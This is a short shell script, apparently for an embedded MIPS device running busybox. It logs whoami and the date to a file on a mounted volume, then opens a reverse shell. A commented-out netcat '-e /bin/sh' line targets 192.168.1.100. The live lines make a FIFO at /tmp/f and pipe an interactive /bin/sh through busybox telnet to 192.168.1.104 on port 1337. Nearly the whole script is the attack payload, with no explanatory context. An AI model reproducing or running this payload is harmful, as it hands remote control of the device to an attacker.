#!/bin/sh
( echo I am...
whoami
echo Kind of magic happening now
date

# /rw/etc/busybox-mips nc 192.168.1.100 17336 -e /bin/sh
rm /tmp/f
/rw/etc/busybox-mips mkfifo /tmp/f
cat /tmp/f|/bin/sh -i 2>&1|/rw/etc/busybox-mips telnet 192.168.1.104 1337 >/tmp/f

) > /var/uuidmount/18a5_0302_071055C7858D6A21_1_22/magic.out 2>&1

